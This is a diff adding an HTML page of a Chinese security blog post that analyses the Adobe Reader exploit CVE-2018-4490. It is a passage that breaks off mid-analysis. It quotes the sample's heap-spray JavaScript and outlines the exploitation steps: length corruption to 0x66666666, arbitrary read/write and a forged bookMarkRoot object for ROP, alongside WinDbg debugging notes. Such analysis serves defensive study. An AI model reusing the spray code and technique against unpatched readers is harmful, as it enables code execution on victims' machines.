@@ -1,0 +1,394 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Adobe漏洞CVE-2018-4490分析 | LYYL' Blog</title><meta name="keywords" content="LYYL, Blog, Pwn, pwn"><meta name="author" content="LYYL"><meta name="copyright" content="LYYL"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="漏洞描述CVE-2018-4490是Adobe在2018年5月修复的一个Adobe Reader DC的0 day漏洞（官方通告为Double Free漏洞，实际为任意地址释放），改漏洞配合Win32k提权漏洞CVE-2018-8120一起使用实现沙箱逃逸，实现任意代码执行。 受影响版本：Adobe Acrobat and Reader versions 2018.011.20038 and ea">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Adobe漏洞CVE-2018-4490分析">
+<meta property="og:url" content="https://www.lyyl.online/posts/103439762.html">
+<meta property="og:site_name" content="LYYL&#39; Blog">
+<meta property="og:description" content="漏洞描述CVE-2018-4490是Adobe在2018年5月修复的一个Adobe Reader DC的0 day漏洞（官方通告为Double Free漏洞，实际为任意地址释放），改漏洞配合Win32k提权漏洞CVE-2018-8120一起使用实现沙箱逃逸，实现任意代码执行。 受影响版本：Adobe Acrobat and Reader versions 2018.011.20038 and ea">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-69.jpeg">
+<meta property="article:published_time" content="2020-11-07T13:56:00.000Z">
+<meta property="article:modified_time" content="2022-05-26T07:56:59.322Z">
+<meta property="article:author" content="LYYL">
+<meta property="article:tag" content="LYYL, Blog, Pwn, pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-69.jpeg"><link rel="shortcut icon" href="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/favicon.png"><link rel="canonical" href="https://www.lyyl.online/posts/103439762"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script async="async" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script>(adsbygoogle = window.adsbygoogle || []).push({
+  google_ad_client: 'ca-pub-8740935439028405',
+  enable_page_level_ads: 'true'
+});</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-MBZHBXMDJ2"></script><script>window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'G-MBZHBXMDJ2');
+</script><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Adobe漏洞CVE-2018-4490分析',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-05-26 15:56:59'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.2.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/favicon.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-69.jpeg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">LYYL' Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Adobe漏洞CVE-2018-4490分析</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-fw post-meta-icon far fa-calendar-alt"></i><span class="post-meta-label">发表于</span><time datetime="2020-11-07T13:56:00.000Z" title="undefined 2020-11-07 21:56:00">2020-11-07</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">5.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>20分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Adobe漏洞CVE-2018-4490分析"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>CVE-2018-4490是Adobe在2018年5月修复的一个Adobe Reader DC的0 day漏洞（官方通告为Double Free漏洞，实际为任意地址释放），改漏洞配合Win32k提权漏洞CVE-2018-8120一起使用实现沙箱逃逸，实现任意代码执行。</p>
+<p>受影响版本：Adobe Acrobat and Reader versions 2018.011.20038 and earlier, 2017.011.30079 and earlier, and 2015.006.30417 and earlier</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.hybrid-analysis.com/search?query=bd23ad33accef14684d42c32769092a0">样本</a>：HASH：bd23ad33accef14684d42c32769092a</p>
+<p>Windows7 SP1 x86，Windbgx86</p>
+<p>Adobe Acrobat Reader Pro DC 2018.011.20035，JP2Klib.lib版本为1.2.2.39492</p>
+<p>这里在Windows7 SP1 X64，Windows10 2004中均可以进行调试，在Windows10中调试时需要注意内存地址<code>0d0e0048</code>可能被占用，需要在安全中心关闭 “验证堆完整性”。</p>
+<h2 id="漏洞利用代码分析"><a href="#漏洞利用代码分析" class="headerlink" title="漏洞利用代码分析"></a>漏洞利用代码分析</h2><p>使用PDFStramDumper打开漏洞样本，在最后发现了漏洞利用的JS代码</p>
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200701122037781.png" alt="image-20200701122037781"></p>
+<p>首先我们来看一下调用<code>fun1</code>之前的部分，前面的<code>dlldata</code>是漏洞触发之后运行的载荷，用于提权等操作。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> spraylen  = <span class="number">0x10000</span>-<span class="number">24</span>;</span><br><span class="line"><span class="keyword">var</span> spraynum  = <span class="number">0x1000</span>;</span><br><span class="line"><span class="keyword">var</span> spraybase = <span class="number">0x0d0e0048</span>;</span><br><span class="line"><span class="keyword">var</span> spraypos  = <span class="number">0x0d0f0058</span>;</span><br><span class="line"><span class="keyword">var</span> sprayarr = <span class="keyword">new</span> <span class="title class_">Array</span>(spraynum);</span><br><span class="line"><span class="keyword">var</span> step = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> myarray;</span><br><span class="line"><span class="keyword">var</span> myarraybase;</span><br><span class="line"><span class="keyword">var</span> mydv;</span><br><span class="line"><span class="keyword">var</span> mypos;</span><br><span class="line"><span class="keyword">var</span> l1 = <span class="number">0x3000</span>;</span><br><span class="line"><span class="keyword">var</span> a1 = <span class="keyword">new</span> <span class="title class_">Array</span>(l1);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i1=<span class="number">1</span>;i1&lt;l1;i1++)</span><br><span class="line">&#123;	</span><br><span class="line">	a1[i1] = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(<span class="number">252</span>);	</span><br><span class="line">	a1[i1][<span class="number">249</span>] = spraybase;</span><br><span class="line">	a1[i1][<span class="number">250</span>] = spraybase+<span class="number">0x10000</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i1=<span class="number">1</span>;i1&lt;spraynum;i1++)</span><br><span class="line">&#123;	</span><br><span class="line">	sprayarr[i1] = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(<span class="number">1</span>);				 </span><br><span class="line">&#125;	</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i1=<span class="number">1</span>;i1&lt;spraynum;i1++)</span><br><span class="line">&#123;	</span><br><span class="line">	sprayarr[i1] = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(spraylen);						 </span><br><span class="line">&#125;		</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i1=<span class="number">1</span>;i1&lt;(l1);i1=i1+<span class="number">2</span>)</span><br><span class="line">&#123;	</span><br><span class="line"> 	<span class="keyword">delete</span> a1[i1];</span><br><span class="line"> 	a1[i1] = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> sprayarr2 = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="comment">//app.alert(1);</span></span><br><span class="line"><span class="keyword">var</span> sto1 = app.<span class="title function_">setTimeOut</span>(<span class="string">&quot;myfun1()&quot;</span>,<span class="number">3500</span>);</span><br></pre></td></tr></table></figure>
+
+<p>在调用<code>myfun1</code>函数之前，构造了<code>a1</code>和<code>sprayarr</code>两个<code>ArrayNuffer</code>，通过堆喷进行了内存布局，这里需要注意的是<code>sprayarr</code>赋值完毕之后对<code>a1</code>进行了间隔释放，构造出了内存空洞。</p>
+<p>完成内存部署之后调用了<code>myfun1，myfun2</code>函数，推测触发漏洞的是<code>var f1 = this.getField(&quot;Button1&quot;);</code>，因为执行完毕之后重新申请一块大小为<code>0x2000-24</code>大小的<code>ArrayBuffer</code>之后，<code>sprayarr</code>中某一个堆块的长度发生了改变，有原来的<code>0x1000</code>增加为了<code>0x2000</code>。</p>
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200701123307460.png" alt="image-20200701123307460"></p>
+<p>由于sprayarr中某一个堆块的大小增加，变为两倍，因此可以修改相邻的堆块的大小（之前sprayarr是连续申请的内存区域），从脚本中可以看出，其将sprayarr的相邻堆块的大小改为了<code>0x66666666</code>大小，攻击者即可以通过该超长的堆块对全局内存进行读写（myread和mywrite为全局读写函数）。泄露dll库的基址之后，通过伪造bookMarkRoot对象执行rop和载荷。</p>
+<h2 id="漏洞调试分析"><a href="#漏洞调试分析" class="headerlink" title="漏洞调试分析"></a>漏洞调试分析</h2><h3 id="数据结构分析"><a href="#数据结构分析" class="headerlink" title="数据结构分析"></a>数据结构分析</h3><p>Windows中每一个堆块的前面都有8字节的HEAP_ENTRY结构体用于堆的管理。</p>
+<h4 id="Array"><a href="#Array" class="headerlink" title="Array"></a>Array</h4><p>漏洞样本中用到了两个对象一个是<code>Uint32Array</code>，一个是<code>ArrayBuffer</code>，我们先来观察一下这两个对象。在<code>app.alert(1)</code>之后添加下列代码，更改代码的操作可以通过PDFStreamdumper中的updata_current_stream来进行。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> sprayarr2 = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> viewContent = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">20</span>);</span><br><span class="line">viewContent[<span class="number">0</span>] = <span class="number">0x1a2b3c4d</span>;</span><br><span class="line">viewContent[<span class="number">1</span>] = sprayarr;</span><br><span class="line">viewContent[<span class="number">2</span>] = a1;</span><br><span class="line">viewContent[<span class="number">3</span>] = sprayarr2;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">alert</span>(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">var</span> sto1 = app.<span class="title function_">setTimeOut</span>(<span class="string">&quot;myfun1()&quot;</span>,<span class="number">3500</span>);</span><br></pre></td></tr></table></figure>
+
+<p>运行样本，在弹窗之后使用<code>Windbg</code>附加到进程中，搜索我们设置的tag</p>
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200701131110806.png" alt="image-20200701131110806"></p>
+<p>Adobe中的对象的存储是通过Value结构体来保存的，除了double和超过32位的整数之外，其他的结构均为高四字节保存类型，低4字节保存值或者实际对象的指针。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">JS_ENUM_HEADER(JSValueType, <span class="type">uint8_t</span>)</span><br><span class="line">&#123;</span><br><span class="line">    JSVAL_TYPE_DOUBLE              = <span class="number">0x00</span>,</span><br><span class="line">    JSVAL_TYPE_INT32               = <span class="number">0x01</span>,</span><br><span class="line">    JSVAL_TYPE_UNDEFINED           = <span class="number">0x02</span>,</span><br><span class="line">    JSVAL_TYPE_BOOLEAN             = <span class="number">0x03</span>,</span><br><span class="line">    JSVAL_TYPE_MAGIC               = <span class="number">0x04</span>,</span><br><span class="line">    JSVAL_TYPE_STRING              = <span class="number">0x05</span>,</span><br><span class="line">    JSVAL_TYPE_NULL                = <span class="number">0x06</span>,</span><br><span class="line">    JSVAL_TYPE_OBJECT              = <span class="number">0x07</span>,</span><br><span class="line">    <span class="comment">/* These never appear in a jsval; they are only provided as an out-of-band value. */</span></span><br><span class="line">    JSVAL_TYPE_UNKNOWN             = <span class="number">0x20</span>,</span><br><span class="line">    JSVAL_TYPE_MISSING             = <span class="number">0x21</span></span><br><span class="line">&#125; JS_ENUM_FOOTER(JSValueType);</span><br></pre></td></tr></table></figure>
+
+<p>我们对应<code>viewContent[0]</code>的类型中的<code>0xffffff81</code>中的<code>1</code>即表示<code>JSVAL_TYPE_INT32</code>类型，同样剩下的三个均为数组因此类型值均为<code>0xffffff87</code>中的<code>0x7</code>。我们看一下<code>sprayarr</code>数组</p>
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200701134351149.png" alt="image-20200701134351149"></p>
+<p>我们发现每一个Array对象通过一个0x28大小的结构来存储，其中偏移0xc的位置存储了指向Array内容的指针，偏移0x2c的位置存储了整个Array的大小。</p>
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200701135701701.png" alt="image-20200701135701701"></p>
+<p>我们查看<code>sprayarr</code>中存储内容的时候发现，<code>Array.buffer</code>的内容的起始地址之前应该还存在<code>0x10</code>字节的内容，通过分析得到<code>0x4</code>偏移处存储的是<code>Array.buffer</code>中使用的空间的大小，而<code>0xc</code>偏移处标记的是<code>Array.buffer</code>的整体大小。因此<code>Array.buffer</code>的对象的数据结构如下</p>
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200701172951861.png" alt="image-20200701172951861"></p>
+<h4 id="ArrayBuffer"><a href="#ArrayBuffer" class="headerlink" title="ArrayBuffer"></a>ArrayBuffer</h4><p>接下来我们通过<code>sparyarr</code>中的元素看一下<code>ArrayBuffer</code>对象，每一个<code>ArrayBuffer</code>对象占用<code>0x7a9e4b8-0x7a9e420=0x98</code>大小的空间，其中偏移<code>0xc</code>的位置存储了指向<code>ArrayBuffer.buffer</code>的数据指针。</p>
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200701173935393.png" alt="image-20200701173935393"></p>
+<p>同<code>Array.buffer</code>的数据结构相同，<code>ArrayBuffer.buffer</code>结构中也存在<code>0x10</code>大小的头部，其中偏移<code>0x4</code>的位置中存储了用户请求的大小，这里申请的大小为<code>0x10000-24=0xffe8</code>。注意到此时的<code>ArrayBuffer.buffer</code>的堆块大小已经是<code>0x10000</code>大小了。<code>ArrayBuffer</code>的数据结构如下</p>
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200701174621188.png" alt="image-20200701174621188"></p>
+<blockquote>
+<p>我们看一下HEAP_ENTRY的结构</p>
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200701185100286.png" alt="image-20200701185100286"></p>
+<p>HEAP_ENTRY中第一个四字节存储的是该堆块的大小和前一个堆块的大小，低地址的一个WORD存储的是该堆块的大小也就是0x91ed，高地址的一个WORD存储的是前一个堆块的大小也就是0x7b11，但是当前的存储结果（堆块大小=存储值*堆分配粒度 这里是0x91ed*8）与实际的堆块大小<code>0x10000</code>不同，这是因为堆头数据进行了编码。我们可以手动解码</p>
+<p>首先找到该堆块所在的堆段</p>
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200701185800045.png" alt="image-20200701185800045"></p>
+<p>我们查看堆结构HEAP中偏移0x50的内容，也就是表示Encoding部分的内容，（EncodeFlagMask表示是否开启了编码，Encoding字段就是用来编码的，编码方式是将Encoding结构与堆头数据进行XOR）</p>
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200701210629321.png" alt="image-20200701210629321"></p>
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200701210744748.png" alt="image-20200701210744748"></p>
+<p>可以看到我们计算出了该堆块的实际大小为0x10000</p>
+</blockquote>
+<h4 id="Unit32Array"><a href="#Unit32Array" class="headerlink" title="Unit32Array"></a>Unit32Array</h4><p>接下来我们看一下a1</p>
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200701211340237.png" alt="image-20200701211340237"></p>
+<p>执行到此处，对a1中奇数下标的对象的释放已经完成，可以看到a1内存中右侧表示对象指针的数据均为0也就是null。已经形成了内存空洞。由于内存是连续申请的，因此从偶数项的内存差值来看，每一个Unit32Array对象的大小为0x58字节</p>
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200701212312561.png" alt="image-20200701212312561"></p>
+<p>申请的Unit32Array的大小为252，也就是0xfc，从三个相邻的Unit32Array结构来看（第二个已经被释放），其偏移0x20位置存储的是byteLength即以字为单位的大小，而偏移0x40的位置存储的是申请的大小，偏移0x50的位置存储的是Unit32Array.buffer的指针，和前两个数据结构一样，该buffer前面也存在0x10大小的头部</p>
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200701213858854.png" alt="image-20200701213858854"></p>
+<p>头部中偏移0x4的位置存储的是byteLength，偏移0x8的位置存储的是指向Unit32Array结构体的指针。此时我们也可以看到攻击者提前写入的两个堆块指针。因此Unit32Array结构体如下所示</p>
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200701214910049.png" alt="image-20200701214910049"></p>
+<blockquote>
+<p>从后面的对Unit32Array的分析中我们可以得知，其前8字节存储的两个内存指针分别指向上一层结构体和该结构体全局变量地址存储的地址，该全局变量中存储了一些函数指针，推测为结构体相关的虚函数表。</p>
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200702174520273.png" alt="image-20200702174520273"></p>
+</blockquote>
+<h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><h4 id="漏洞代码定位"><a href="#漏洞代码定位" class="headerlink" title="漏洞代码定位"></a>漏洞代码定位</h4><p>首先开启全页堆（对堆漏洞的调试有很大的帮助），定位漏洞触发点。<a target="_blank" rel="noopener external nofollow noreferrer" href="https://docs.microsoft.com/zh-cn/windows-hardware/drivers/debugger/gflags">gflags</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gflags -p /enable Acrobat.exe /full</span><br><span class="line">gflags -p /enable AcroCEF.exe /full</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>应用程序验证器提供了页堆（PageHeap）机制进行堆破坏的跟踪。页堆机制分为两种一种是普通页堆（Normal PageHeap），一种是全页堆（Full PageHeap）。</p>
+<ul>
+<li><p>普通堆块和页堆块的差别是增加了页堆元数据。同时我们可以从下图中看到页堆可以通过填充模式来检测堆破坏。</p>
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200627225154173.png" alt="image-20200627225154173"></p>
+<p>可以通过<code>_DPH_BLOCK_INFORMATION</code>来查看页堆元数据的具体内容，比较有用的是<code>0x18</code>位置的栈回溯，可以方便调试者快速定位异常函数</p>
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200627223201200.png" alt="image-20200627223201200"></p>
+</li>
+<li><p>全页堆则是在每一个堆块的前后均增加一个不可访问的内存页（防护页），用来检测堆的上溢和下溢</p>
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200627224747141.png" alt="image-20200627224747141"></p>
+</li>
+</ul>
+</blockquote>
+<p>程序运行崩溃之后栈回溯情况如下</p>
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200627222351927.png" alt="image-20200627222351927"></p>
+<p>我们可以看到发生访问违例发生在堆管理器中，程序正在尝试释放堆块，这很有可能是发生了堆破坏。我们注意到释放的堆地址为<code>0xd0d0d0d0</code>。这个地址比较特殊，因为这是在开启全页堆之后堆块的后置填充区的填充内容。因此可能发生了堆内存的越界访问。</p>
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200628120641702.png" alt="image-20200628120641702"></p>
+<p>我们看到调用释放内存的函数是<code>JP2KLib!JP2KCopyRect+0xbae6</code>，在IDA中看一下此处位置的代码逻辑。</p>
